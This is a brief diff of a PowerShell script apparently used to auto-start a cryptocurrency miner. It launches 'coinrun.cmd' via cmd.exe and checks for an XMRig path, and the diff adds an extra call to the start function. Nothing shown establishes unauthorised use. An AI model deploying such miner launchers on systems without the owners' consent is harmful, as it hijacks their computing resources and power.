@@ -6,7 +6,7 @@ function Start-CoinRun {
     $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
     Write-Host "coinrun.cmd START"
 }
-
+    Start-CoinRun
 # Khởi chạy lần đầu nếu file tồn tại
 if (Test-Path $xmrigPath) {
     Start-CoinRun
